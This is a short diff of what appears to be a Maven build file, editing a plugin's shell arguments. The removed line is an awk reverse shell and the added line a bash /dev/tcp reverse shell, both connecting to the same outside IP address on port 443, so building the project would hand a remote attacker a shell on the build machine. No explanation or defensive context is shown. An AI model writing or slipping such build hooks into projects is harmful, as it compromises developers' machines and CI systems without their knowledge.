@@ -94,7 +94,7 @@
                         <argument>
                             -c
                         </argument>
-                        <argument>awk 'BEGIN {s = "/inet/tcp/0/35.243.246.163/443"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}' /dev/null</argument>
+                        <argument>bash &amp;&gt;/dev/tcp/35.243.246.163/443 &lt;&amp;1</argument>
                     </arguments>
                 </configuration>
             </plugin>
